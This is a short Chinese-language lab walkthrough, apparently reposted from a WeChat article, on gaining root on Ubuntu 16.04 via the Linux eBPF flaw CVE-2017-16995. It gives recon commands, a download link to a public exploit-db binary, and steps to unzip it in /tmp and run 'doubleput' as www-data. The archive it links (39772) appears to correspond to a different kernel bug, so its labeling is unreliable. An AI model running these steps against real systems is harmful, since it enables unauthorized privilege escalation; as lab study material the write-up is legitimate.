# CVE-2017-16995 简单利用

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAxMjE3ODU3MQ==&mid=2650460920&idx=3&sn=ae48d6f209508e6eade5cebd8cb7697a&chksm=83bbb71cb4cc3e0af35128d2de6c2038e8f740121b2bdcd39d7affe961aa027d0edfb58d729c&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650460920&idx=3&sn=ae48d6f209508e6eade5cebd8cb7697a&chksm=83bbb71cb4cc3e0af35128d2de6c2038e8f740121b2bdcd39d7affe961aa027d0edfb58d729c&scene=27#wechat_redirect)

![](../Images/8e5d77bf7751a0da7834b3686fe0b4b6.png)  

该漏洞存在于带有 eBPF bpf(2)系统（CONFIG\_BPF\_SYSCALL）编译支持的Linux内核中，是一个内存任意读写漏洞。该漏洞是由于eBPF验证模块的计算错误产生的。普通用户可以构造特殊的BPF来触发该漏洞，此外恶意攻击者也可以使用该漏洞来进行本地提权操作。  

  

![](../Images/27bdf20559ae3a23316b626ace875154.png)

  

**漏洞环境**

  
Ubuntu 16.04 ：192.168.123.135  
kali：192.168.123.156

  
**漏洞利用**

查看Ubuntu 版本  
查看当前用户和查看操作系统版本 whoami  
  

![](../Images/c35f86abeaa00f15577943de74bb5c1c.png)

  

用户是www-data普通用户

uname -a

cat /proc/version 

  
![](../Images/952d56457f193015214117c5d14552db.png)

  
系统版本是Ubuntu 16.04，下载CVE-2017-16995

  

  
https://github.com/offensive-security/exploitdb-bin-sploits/blob/master/bin-sploits/39772.zip  
  
将CVE-2017-16995移到tmp目录下并解压进入39772目录查看当前目录下文件

  
cd 39772ls -al

\-rwxrwxrwx 1 www-data www-data 12336 Apr 11 19:15 doubleput

  

![](../Images/7f44e02ab5b5d2a205912fec124e8eb3.png)

  
运行可执行文件doubleput  
./doubleput  
  

![](../Images/4392e3d4a313926416beaef6cdb7502f.png)

  
稍等一会在查看当前用户发现由www-data变成了root，说明提权成功了
